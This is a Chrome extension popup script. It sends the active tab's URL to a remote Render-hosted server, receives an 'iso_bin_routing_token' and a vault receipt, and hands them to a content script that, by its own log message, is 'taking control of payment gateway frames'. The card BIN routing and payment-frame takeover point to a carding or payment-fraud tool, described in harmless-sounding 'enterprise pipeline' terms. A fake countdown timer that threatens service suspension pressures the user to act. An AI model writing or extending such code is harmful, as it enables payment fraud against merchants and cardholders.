let currentTimeoutTtl = 45; // Strict system network threshold lifetime parameter
let expirationCountdownTimer = null;

document.addEventListener('DOMContentLoaded', async () => {
  const logSummary = document.getElementById('logSummary');
  const ledgerLogs = document.getElementById('ledgerLogs');
  
  if (logSummary) {
    logSummary.style.color = '#2b8a3e';
    logSummary.style.backgroundColor = '#e8f5e9';
    logSummary.style.borderColor = '#c8e6c9';
    logSummary.innerHTML = `Status: CLOUD_CONNECTED | TTL: ${currentTimeoutTtl}s`;
  }

  // 1. Initialize active countdown processing loop
  expirationCountdownTimer = setInterval(() => {
    currentTimeoutTtl--;
    if (currentTimeoutTtl <= 0) {
      clearInterval(expirationCountdownTimer);
      if (logSummary) {
        logSummary.style.color = '#c92a2a';
        logSummary.style.backgroundColor = '#fff5f5';
        logSummary.style.borderColor = '#ffc9c9';
        logSummary.innerHTML = "<strong>CRITICAL TIMEOUT: SERVICE SUSPENDED</strong>";
      }
      if (ledgerLogs) ledgerLogs.innerText += '\n> [TIMEOUT] Connection dropped. Re-authenticate to refresh context.';
      document.getElementById('injectBtn').disabled = true;
      document.getElementById('injectBtn').style.backgroundColor = '#ced4da';
    } else {
      if (logSummary) logSummary.innerHTML = `Status: CLOUD_CONNECTED | TTL: ${currentTimeoutTtl}s`;
    }
  }, 1000);
});

document.getElementById('injectBtn').addEventListener('click', async () => {
  const logSummary = document.getElementById('logSummary');
  const ledgerLogs = document.getElementById('ledgerLogs');
  const targetCloudGateway = 'https://onrender.com';

  if (currentTimeoutTtl <= 0) return;

  if (logSummary) logSummary.innerText = 'Orchestrating...';
  if (ledgerLogs) ledgerLogs.innerText += '\n> Running multi-stage system evaluation checks...';

  const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!activeTab) return;

  // 2. Transmit initial payload containing structural parameters to Render Cloud Core
  fetch(targetCloudGateway, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      action: "INITIAL_VAULT_QUERY", 
      origin: activeTab.url,
      pricing_matrix: { one_time_cost: "1848.99", recurring_cost: "77.00", currency: "USD" }
    })
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === "AUTHORIZED") {
      clearInterval(expirationCountdownTimer); // Clear ticker memory upon secure token retrieval
      const pipelineRoutingToken = data.iso_bin_routing_token;
      const vaultReceipt = data.vault_receipt;

      chrome.storage.local.set({ "active_vault_receipt": vaultReceipt });

      if (logSummary) logSummary.innerHTML = "<strong>AUTOMATION ACTIVE</strong>";
      if (ledgerLogs) ledgerLogs.innerText += `\n> Token Released: ${pipelineRoutingToken}\n> Taking control of payment gateway frames...`;

      // 3. Dispatch execution variables down into content.js running in webpage context
      chrome.tabs.sendMessage(activeTab.id, { 
        action: "EXECUTE_ENTERPRISE_PIPELINE", 
        tokenData: pipelineRoutingToken,
        vaultReceipt: vaultReceipt
      }, (response) => {
        if (!chrome.runtime.lastError && response) {
          if (ledgerLogs) ledgerLogs.innerText += `\n> Pipeline Sync: ${response.status}`;
          setTimeout(() => { window.close(); }, 1200);
        }
      });
    }
  })
  .catch(err => {
    if (logSummary) { logSummary.style.color = '#c92a2a'; logSummary.innerText = 'ROUTING EXCEPTION'; }
  });
});
